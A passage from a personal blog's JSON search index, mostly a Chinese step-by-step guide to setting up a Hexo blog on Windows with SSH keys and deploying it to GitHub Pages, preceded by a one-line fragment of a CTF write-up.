page，就加上login.php，就能得到key了","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"Windows下利用hexo和github搭建博客","slug":"Windows下利用hexo和github搭建博客","date":"2017-11-18T14:12:54.000Z","updated":"2018-07-01T02:09:38.385Z","comments":true,"path":"2017/11/18/Windows下利用hexo和github搭建博客/","link":"","permalink":"https://qianfei11.github.io/2017/11/18/Windows下利用hexo和github搭建博客/","excerpt":"记录下在windows下搭建博客的步骤。","text":"记录下在windows下搭建博客的步骤。 下载安装gitgit下载地址 下载安装node.jsnode.js下载地址 github账号注册和新建仓库仓库名必须为“账户名.github.io”，勾选“Initialize this repository with a README” 安装hexo通过命令行输入 1npm install hexo -g 注：-g是指全局安装hexo。 再输入 1hexo -v 检测是否安装成功 初始化Hexo创建文件夹根据个人爱好在本地创建博客文件夹，用于保存博客的本地文件 初始化在Hexo文件下，右键运行Git Bash，输入命令： 1hexo init 初始化成功后生成的一些列文件 再输入 1npm install 安装所需要的组件 配置在_config.yml，进行基础配置 本地浏览博客分别输入如下命令： 12hexo ghexo s 在浏览器输入：localhost:4000 ，就可以对本地的博客进行访问。 写文章在博客文件夹下输入 1hexo new post &quot;xxx&quot; 即能创建新博文，声称在_posts文件夹下 或是在_posts文件夹下，新建.md文件就可以写文章 ssh设置在博客文件夹下打开git bash后，分别输入 1git config --global user.name &quot;你的名字&quot; 和 1git config --global user.email &quot;你的邮箱&quot; 输入 1cd ~/.ssh 再输入 1ssh-keygen -t rsa -C &quot;你的邮箱&quot; 连续三个回车，生成密钥 再输入 1eval &quot;$(ssh-agent -s)&quot; 以添加密钥到ssh-agent 再输入 1ssh-add ~/.ssh/id_rsa 添加生成的SSH key到ssh-agent 然后登陆github，点击头像下的settings，添加一个新的ssh，将id_rsa.pub文件里的内容复制上去 输入 1ssh -T git@github.com 如果出现“Hi 你的名字”，说明成功了 假如ssh-key配置失败首先，清除所有的key-pair 12ssh-add -Drm -r ~/.ssh 删除你在github中的public-key 重新生成ssh密钥对 1ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot; 部署到Github在_config.yml进行配置deploy: type: git repository: git@github.com:你的名字/你的名字.github.io.git branch: master 安装hexo-deployer-git自动部署发布工具1npm install hexo-deployer-git --save 发布到Github输入如下命令： 1hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 第一次发布需要验证github账号。 浏览器打开“你的名字.github.io”，就是你的博客了 这样就完成了简单的搭建。","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://qianfei11.github.io/tags/hexo/"},{"name":"github","slug":"github","permalink":"https://qianfei11.github.io/tags/github/"},{"name":"windows","slug":"windows","permalink":"https://qianfei11.github.io/tags/windows/"}]}]}